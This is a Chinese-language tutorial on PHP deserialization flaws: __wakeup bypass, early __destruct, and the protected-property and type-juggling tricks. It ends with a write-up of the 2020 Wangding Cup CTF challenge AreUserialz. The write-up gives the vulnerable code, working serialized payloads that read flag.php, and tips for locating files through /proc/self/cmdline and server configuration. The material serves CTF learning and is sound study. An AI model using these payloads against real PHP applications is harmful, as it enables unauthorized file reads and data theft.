# PHP序列化与反序列化

PHP中通过serialize(),unserialize()两函数来进行对象序列化与反序列化

序列化与反序列化是一个基本的将对象转换为可传输字符串，再将字符串转换为对象的过程，其本身没有问题，但是如果使用了不正确的魔法函数，就会出现安全问题

注意事项：

因为类的变量类型有public，private，protected

public：声明方法和属性可以被随意访问。
protected：声明的方法和属性只能被类本身和其继承子类访问。
private：只能被定义属性和方法的类访问。

对三种类型序列化后的格式也不相同

测试函数如下：

```php
<?php
class xctf{ //类
public $a=1;
private $b=2;
protected $c=3;
}
$a=new xctf();
$b=serialize($a);
echo($b);
?>
```

输出结果：

```php
O:4:"xctf":3:{s:1:"a";i:1;s:7:"%00xctf%00b";i:2;s:4:"%00*%00c";i:3;}
```

private变量序列化后变量名为 

```php
%00xctf%00b
```

protected变量序列化后变量名为

```php
%00*%00c
```

这里也存在一个反序列化漏洞

在PHP7.2+时，虽然变量定义是private或protected类型，但是同样也可以构造public类型的序列化字符串，并且能够成功的反序列化

构造全为public的序列化字符串

```php
O:4:"xctf":3:{s:1:"a";i:1;s:1:"b";i:2;s:1:"c";i:3;}
```

进行反序列化

```php
<?php
class xctf{ //类
public $a=1;
private $b=2;
protected $c=3;
}
$a="O:4:\"xctf\":3:{s:1:\"a\";i:1;s:1:\"b\";i:2;s:1:\"c\";i:3;}";
$b=unserialize($a);
var_dump($b);
?>
```

运行结果

```php
object(xctf)#1 (3) {
  ["a"]=>
  int(1)
  ["b":"xctf":private]=>
  int(2)
  ["c":protected]=>
  int(3)
}
```

## 常见魔法函数

```php
__construct() 当一个对象创建时被调用

__destruct() 当一个对象销毁时被调用

__toString() 当一个对象被当作一个字符串时使用

__sleep() 在对象被序列化之前运行

__wakeup() 在对象被反序列化之前运行
```

如果使用了不正确的魔法函数，并且存在可以绕过的逻辑，那么就会出现安全问题，在CTFweb基本反序列化题目中，总是将PHP弱类型和反序列化结合起来

## PHP弱类型

PHP中有两种比较符号：“==”和“===”

“==”：当等号两边为当等号两边为相同类型时，直接比较值是否相等；当等号两边类型不同时，先转换为相同的类型，再对转换后的值进行比较，如果比较一个数字和字符串或者涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照常数值进行比较。

这里对于字符串转换为数值有如下规则，在PHP手册中定义：

```
当一个字符串当作一个数值来取值，其结果和类型如下:如果该字符串没有包含'.','e','E'并且其数值值在整形的范围之内
该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。
```

根据这个理解：

当“1admin"==1时字符串被转换成了1 所以结果为true

当”admin1“==1时字符串被转换成了0 所以结果为false



”===“：在进行比较时，会先判断两种字符串类型是否相等，再比较，所以这里判断时不会再进行类型转换

## 魔法函数的各种利用

### _wakeup绕过

```php
<?php
class xctf{ //类
public $flag = '111';//public定义flag变量公开可见
public function __wakeup(){
echo "wake\r\n";
  }
}
$a=new xctf();
echo(serialize($a));
?>
```

此时的_wakeup()会在反序列化之前进行调用，所以要对此函数进行绕过才能进行反序列化操作输出flag

首先序列化后的字符串为

```php
O:4:"xctf":1:{s:4:"flag";s:3:"111";}
```

此时将字符串进行反序列化

```php
<?php
class xctf{ //类
public $flag = '111';//public定义flag变量公开可见
public function __wakeup(){
echo "wake\r\n";
  }
}
$a="O:4:\"xctf\":1:{s:4:\"flag\";s:3:\"111\";}";
$b=unserialize($a);
var_dump($b);
?>
```

输出结果：

```php
wake
object(xctf)#1 (1) {
  ["flag"]=>
  string(3) "111"
}
```

可以看到此时_wakeup函数已经执行

_wakeup漏洞：

当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过 _wakeup() 的执行。

此时修改属性个数1->2此时会绕过_wake()函数的执行

```php
O:4:"xctf":2:{s:4:"flag";s:3:"111";}
```

构造代码：

```php
<?php
class xctf{ //类
public $flag = '111';//public定义flag变量公开可见
public function __wakeup(){
echo "wake\r\n";
  }
}
$a="O:4:\"xctf\":2:{s:4:\"flag\";s:3:\"111\";}";
$b=unserialize($a);
var_dump($b);
?>
```

输出结果：由于不正确的字符串，所以反序列化后的值为false

```
bool(false)
```

### _destruct()提前执行

当一个对象销毁时会执行 _destruct() 析构函数，我们可以利用构造一个不完整的序列化字符串来实现析构函数的直接执行

首先和上面一样构造一个正常的序列化字符串

```php
O:4:"xctf":1:{s:4:"flag";s:3:"111";}
```

此时运行函数：

```php
<?php
class xctf{ //类
public $flag = '111';//public定义flag变量公开可见
public function __destruct(){
echo "des\r\n";
 }
}
$a="O:4:\"xctf\":1:{s:4:\"flag\";s:3:\"111\";}";
$b=unserialize($a);
var_dump($b);
?>
```

输出的结果

```php
object(xctf)#1 (1) {
  ["flag"]=>
  string(3) "111"
}
des
```

此时发现首先是进行了字符串的反序列化，然后进行了析构函数的执行，那么如果构造一个不完整的序列化字符串

```php
O:4:"xctf":1:{s:4:"flag";s:3:"111"; //少了最后一个’}‘号
```

此时再运行反序列化时

```php
<?php
class xctf{ //类
public $flag = '111';//public定义flag变量公开可见
public function __destruct(){
var_dump($b);
 }
}
$a="O:4:\"xctf\":1:{s:4:\"flag\";s:3:\"111\";";
$b=unserialize($a);
var_dump($b);
?>
```

先执行了析构函数，然后再输出了b的值，此时因为序列化字符串不完整报错，所以结果为false

```php
des
bool(false)
```

深入思考，不完整的序列化字符串在调用析构时的值是什么样的？

```php
<?php
class xctf{ //类
public $a=1;
private $b=2;
protected $c=3;
	function __destruct() {
       var_dump($this);
	}
}
$a="O:4:\"xctf\":3:{s:1:\"a\";i:1;s:1:\"b\";i:2;s:1:\"c\";i:3;";
$b=unserialize($a);
var_dump($b);
?>
```

此时a为去掉最后’}‘号的不完整序列化字符串

输出结果

```php
object(xctf)#1 (3) {
  ["a"]=>
  int(1)
  ["b":"xctf":private]=>
  int(2)
  ["c":protected]=>
  int(3)
}
bool(false)
```

说明反序列化不完整的序列化字符串在发现不完整之后会进行析构，但在析构完成之前还保存着原始值，所以如果析构函数中还有某个利用字符串值进行操作的函数时，还会正常运行

## 2020第二届网鼎杯青龙组 AreUserialz

利用点：

PHP反序列化，PHP弱类型

贴出题目源码

```php
<?php
include("flag.php");
highlight_file(__FILE__);
class FileHandler {
    protected $op;
    protected $filename;
    protected $content;
    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();   
    }
    public function process() {
        if($this->op == "1") {
            $this->write();       
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }
    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }
    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }
    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }
    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }
}
function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}
if(isset($_GET{'str'})) {
    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }
}
```

在自己电脑上搭建了这个环境的靶场，注意要将php版本改为php7.2+，不然无法正常漏洞利用

### 绕过is_valid()和PHP弱类型判断

绕过方法一：

首先发现三个变量都是protected类型的变量，因为php7.2+有覆盖漏洞，则可以构造三个public类型变量进行序列化

```php
class FileHandler {
    public $op;
    public $filename;
    public $content;
}
```

构造序列化字符串绕过is_valid(),并且源码里需要保证op值 op==“2”&&op!=="2" 这里需要利用PHP弱类型 直接让op 为int类型值为2

```php
O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;}
```

回显：

![image-20200720152618163](https://ka1t4v-1302680532.cos.ap-beijing.myqcloud.com/image-20200720152618163.png)

绕过方法二：

因为过滤函数过滤了protected函数生成的%00字段，%00在url解码后ascii编码为0，那么可以使用 大写S+十六进制\00

绕过，构造payload

```php
O:11:"FileHandler":3:{S:5:"\00*\00op";i:2;S:11:"\00*\00filename";S:8:"flag.php";S:10:"\00*\00content";N;}
```

回显：

![image-20200720152714513](https://ka1t4v-1302680532.cos.ap-beijing.myqcloud.com/image-20200720152714513.png)

这两种方法都成功绕过了is_valid()和php弱类型的判断，但是由于读取目录是相对目录，可见在当前代码运行环境，并不能读取到flag.php文件

![image-20200720153512264](https://ka1t4v-1302680532.cos.ap-beijing.myqcloud.com/image-20200720153512264.png)

### 读取flag目录的方法

当时比赛的环境为linux系统，那么linux系统下有几个很重要的目录

默认web文件夹目录 /var/www/html/ 

然后是 /proc目录 下有很多记录文件

1. maps 记录一些调用的扩展或者自定义 so 文件
2. environ 环境变量
3. comm 当前进程运行的程序
4. cmdline 程序运行的绝对路径
5. cpuset docker 环境可以看 machine ID
6. cgroup docker环境下全是 machine ID 不太常用

可以读取目录 /proc/self/cmdline 来查看当前程序运行的绝对路径

![image-20200720154056727](https://ka1t4v-1302680532.cos.ap-beijing.myqcloud.com/image-20200720154056727.png)

可以得到/web/config/httpd.conf 为web服务配置文件

再次读取这个文件，可以得到主页的配置路径

![image-20200720154513727](https://ka1t4v-1302680532.cos.ap-beijing.myqcloud.com/image-20200720154513727.png)

那么就可知flag绝对路径为 /web/html/flag.php

### 通过相对路径读取flag.php的方法

可以通过直接构造不完整字符串的方法，在反序列化时会报错，跳出执行路径，返回根目录，再执行_destruck()析构函数，进行变量的析构，此时的析构执行路径为根目录，就可以用相对目录来读取flag.php

构造不完整payload

```php
O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N; //缺少最后的“}”
```

可以看到回显逻辑

![image-20200720160241372](https://ka1t4v-1302680532.cos.ap-beijing.myqcloud.com/image-20200720160241372.png)

1.发现错误，报错，此时执行环境应该被切换到了网页根目录

2.进行析构函数执行

3.相对路径读取的当前目录下的flag.php

所以此时根据相对路径成功读取flag.php